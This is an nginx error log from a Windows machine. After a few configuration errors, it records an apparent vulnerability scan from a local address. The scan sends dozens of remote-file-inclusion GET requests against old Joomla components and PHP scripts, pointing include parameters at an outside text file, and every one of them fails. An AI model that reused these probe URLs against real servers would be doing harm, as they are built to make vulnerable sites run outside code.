2019/04/18 20:22:26 [notice] 7436#6776: signal process started
2019/04/18 20:28:01 [emerg] 12700#6984: "server_tokens" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:4
2019/04/18 20:28:29 [emerg] 12460#11644: "add_header" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:8
2019/04/18 20:28:45 [emerg] 8020#7960: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:3
2019/04/18 20:29:48 [emerg] 9964#4972: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:2
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jpack/includes/CAltInstaller.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_jreactions/langset.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_jreactions/langset.php?comPath=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_juser/xajax_functions.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_kochsuite/config.kochsuite.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_lurm_constructor/admin.lurm_constructor.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mmp/help.mmp.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/credits.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/info.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/media.divs.js.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/media.divs.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/purchase.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_mosmedia/includes/support.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_multibanners/extadminmenus.class.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_nfn_addressbook/nfnaddressbook.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_ongumatimesheet20/lib/onguma.class.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_panoramic/admin.panoramic.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_phpshop/toolbar.phpshop.html.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *160 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_remository/admin.remository.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_rssreader/admin.rssreader.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_serverstat/install.serverstat.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_tour_toto/admin.tour_toto.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_tour_toto/admin.tour_toto.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_treeg/admin.treeg.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_webring/admin.webring.docs.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_webring/admin.webring.docs.php?component_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_wmtgallery/admin.wmtgallery.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_wmtportfolio/admin.wmtportfolio.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/components/com_wmtrssreader/admin.wmtrssreader.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/components/com_wmtrssreader/admin.wmtrssreader.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/menu_add.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/menu_add.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator/menu_operation.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator/menu_operation.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adminpanel/includes/add_forms/addmp3.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adminpanel/includes/add_forms/addmp3.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adminpanel/includes/mailinglist/mlist_xls.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adminpanel/includes/mailinglist/mlist_xls.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adodb/adodb-errorpear.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adodb/adodb-errorpear.inc.php?ourlinux_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adodb/adodb-pear.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adodb/adodb-pear.inc.php?ourlinux_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/adodb/adodb.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /adodb/adodb.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/advanced_comment_system/admin.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /advanced_comment_system/admin.php?ACS_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/advanced_comment_system/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /advanced_comment_system/index.php?ACS_path=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/afb-3-beta-2007-08-28/_includes/settings.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/afb-3-beta-2007-08-28/_includes/settings.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/agenda.php3" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /agenda.php3?rootagenda=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/agenda2.php3" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /agenda2.php3?rootagenda=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:40:48 [error] 8784#13012: *161 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/aides/index.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /aides/index.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
